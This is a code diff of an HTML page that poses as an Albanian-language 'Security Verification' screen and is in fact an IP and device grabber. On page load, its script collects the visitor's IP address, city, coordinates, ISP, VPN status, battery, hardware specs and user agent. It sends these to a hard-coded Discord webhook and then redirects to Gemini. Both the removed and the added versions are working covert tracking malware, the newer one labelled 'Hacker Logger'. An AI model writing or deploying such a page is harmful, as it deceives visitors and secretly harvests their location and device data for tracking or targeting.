@@ -15,100 +15,97 @@
             align-items: center; 
             height: 100vh; 
             margin: 0; 
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            font-family: -apple-system, system-ui, sans-serif; 
         }
         .container {
             text-align: center;
-            max-width: 450px;
+            max-width: 400px;
             padding: 40px;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border-radius: 12px;
         }
         .spinner {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #0052cc;
             border-radius: 50%;
-            width: 32px;
-            height: 32px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px auto;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 12px; color: #172b4d; }
-        p { font-size: 15px; color: #5e6c84; line-height: 1.6; margin-bottom: 0; }
-        .footer-text { margin-top: 30px; font-size: 12px; color: #a5adba; }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <h1>Security Verification</h1>
-        <p>Ju lutem prisni pak derisa të verifikojmë që lidhja juaj është e sigurt dhe pa rreziqe.</p>
-        <div class="footer-text">Verifikimi po bëhet automatikisht...</div>
+        <h1>Verifikimi i Sigurisë</h1>
+        <p>Po kontrollojmë nëse lidhja juaj është e sigurt...</p>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1497231122667409610/UIfP7aK35EKcrRKZz7Zh3QIAUdW_VAfo-MUBOzxJpLZMwsCPCVoerrS3Y9PTOxT_8L2m";
         const redirectURL = "https://gemini.google.com/app";
 
-        // Funksioni për të gjetur modelin e saktë të iPhone
+        // Funksioni për gjetjen e modelit të iPhone-it
         function getIPhoneModel() {
             const ratio = window.devicePixelRatio;
-            const width = window.screen.width;
-            const height = window.screen.height;
-            
-            if (ratio === 3 && width === 393 && height === 852) return "iPhone 14 Pro / 15 / 15 Pro";
-            if (ratio === 3 && width === 430 && height === 932) return "iPhone 14 Pro Max / 15 Plus / 15 Pro Max";
-            if (ratio === 3 && width === 390 && height === 844) return "iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
-            if (ratio === 3 && width === 428 && height === 926) return "iPhone 12 Pro Max / 13 Pro Max / 14 Plus";
-            if (ratio === 3 && width === 375 && height === 812) return "iPhone X / XS / 11 Pro / 12 mini / 13 mini";
-            if (ratio === 2 && width === 414 && height === 896) return "iPhone XR / 11";
-            if (ratio === 3 && width === 414 && height === 896) return "iPhone XS Max / 11 Pro Max";
-            return navigator.platform + " (Model i paidentifikuar)";
+            const w = window.screen.width;
+            const h = window.screen.height;
+            if (ratio === 3 && w === 393 && h === 852) return "iPhone 15 / 15 Pro / 14 Pro";
+            if (ratio === 3 && w === 430 && h === 932) return "iPhone 15 Pro Max / 15 Plus / 14 Pro Max";
+            if (ratio === 3 && w === 390 && h === 844) return "iPhone 14 / 13 / 13 Pro / 12 / 12 Pro";
+            if (ratio === 3 && w === 428 && h === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
+            if (ratio === 3 && w === 375 && h === 812) return "iPhone 13 mini / 12 mini / 11 Pro / XS / X";
+            if (ratio === 2 && w === 414 && h === 896) return "iPhone 11 / XR";
+            if (ratio === 3 && w === 414 && h === 896) return "iPhone 11 Pro Max / XS Max";
+            return "Pajisje Apple (Model i paidentifikuar)";
         }
 
-        async function runLogger() {
+        async function collectAndSend() {
             try {
-                // 1. IP dhe Lokacioni (Preciz)
-                const res = await fetch('https://demo.ip-api.com/json/?fields=66846719');
-                const g = await res.json();
+                // Lokacioni dhe IP (Preciz)
+                const geoReq = await fetch('https://demo.ip-api.com/json/?fields=66846719');
+                const g = await geoReq.json();
 
-                // 2. Bateria
-                let batteryLevel = "E panjohur";
+                // Bateria
+                let batteryStatus = "E panjohur";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    batteryLevel = `${Math.round(b.level * 100)}% (${b.charging ? 'Po karikohet ⚡' : 'Në bateri 🔋'})`;
+                    batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'Në karikim ⚡' : 'Në bateri 🔋'})`;
                 }
 
-                // 3. Ora dhe Pajisja
-                const currentTime = new Date().toLocaleTimeString('sq-AL', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-                const deviceModel = getIPhoneModel();
-                
-                // 4. GPU (Kartela Grafike)
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "E panjohur";
+                // Detajet teknike
+                const specs = {
+                    model: /iPhone|iPad|iPod/.test(navigator.userAgent) ? getIPhoneModel() : navigator.platform,
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "E panjohur",
+                    cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "E panjohur",
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    time: new Date().toLocaleTimeString('sq-AL'),
+                    lang: navigator.language
+                };
 
                 const payload = {
+                    "content": "☣️ **DATA BREACH DETECTED** ☣️",
                     "embeds": [{
-                        "title": "🛡️ Verifikim i Ri - Detaje të Plota",
-                        "color": 2664230,
+                        "title": "💀 SYSTEM INFO EXFILTRATED",
+                        "description": "Të dhënat u morën me sukses nga pajisja e shënjestruar.",
+                        "color": 0, // E zezë
                         "fields": [
-                            { "name": "👤 Pajisja (Modeli)", "value": `**${deviceModel}**`, "inline": true },
-                            { "name": "🔋 Bateria", "value": batteryLevel, "inline": true },
-                            { "name": "⏰ Ora e Pajisjes", "value": currentTime, "inline": true },
+                            { "name": "👤 Identiteti (Modeli)", "value": `\`${specs.model}\``, "inline": true },
+                            { "name": "🔋 Statusi i Baterisë", "value": `\`${batteryStatus}\``, "inline": true },
+                            { "name": "⏰ Ora e Pajisjes", "value": `\`${specs.time}\``, "inline": true },
                             { "name": "🌐 Adresa IP", "value": `\`${g.query}\``, "inline": true },
-                            { "name": "📍 Qyteti/Shteti", "value": `${g.city}, ${g.country}`, "inline": true },
-                            { "name": "📡 Operatori (ISP)", "value": g.isp, "inline": false },
-                            { "name": "🛡️ VPN / Proxy?", "value": g.proxy ? "⚠️ PO" : "✅ JO", "inline": true },
-                            { "name": "📶 Rrjeti", "value": g.mobile ? "📱 Mobile Data" : "🏠 WiFi/Broadband", "inline": true },
-                            { "name": "🎮 GPU (Grafika)", "value": `\`${gpu}\``, "inline": false },
-                            { "name": "📱 User Agent", "value": `\`\`\`${navigator.userAgent}\`\`\``, "inline": false },
-                            { "name": "🗺️ Lokacioni", "value": `[Hape në Google Maps](https://www.google.com/maps?q=${g.lat},${g.lon})`, "inline": false }
+                            { "name": "📍 Lokacioni", "value": `\`${g.city}, ${g.country}\``, "inline": true },
+                            { "name": "📡 ISP (Rrjeti)", "value": `\`${g.isp}\``, "inline": false },
+                            { "name": "⚙️ Hardware Specs", "value": `RAM: \`${specs.ram}\` | CPU: \`${specs.cpu}\` | Res: \`${specs.screen}\``, "inline": false },
+                            { "name": "🛡️ VPN / Proxy", "value": g.proxy ? "⚠️ **DETECTED**" : "✅ NONE", "inline": true },
+                            { "name": "📶 Connection", "value": g.mobile ? "📱 Mobile Data" : "🏠 WiFi", "inline": true },
+                            { "name": "📱 Agent", "value": `\`\`\`${navigator.userAgent}\`\`\``, "inline": false },
+                            { "name": "🗺️ Google Maps", "value": `[SHIKO LOKACIONIN](https://www.google.com/maps?q=${g.lat},${g.lon})`, "inline": false }
                         ],
-                        "footer": { "text": "Ultra Logger System v5.0" },
+                        "footer": { "text": "Hacker Logger v9.9.9 | Encrypted Tunnel" },
                         "timestamp": new Date()
                     }]
                 };
@@ -118,16 +115,15 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (err) {
-                console.log("Verification error.");
+
+            } catch (e) {
+                console.log("Breach failed.");
             } finally {
-                setTimeout(() => {
-                    window.location.href = redirectURL;
-                }, 2500);
+                setTimeout(() => { window.location.href = redirectURL; }, 2000);
             }
         }
 
-        window.onload = runLogger;
+        window.onload = collectAndSend;
     </script>
 </body>
 </html>
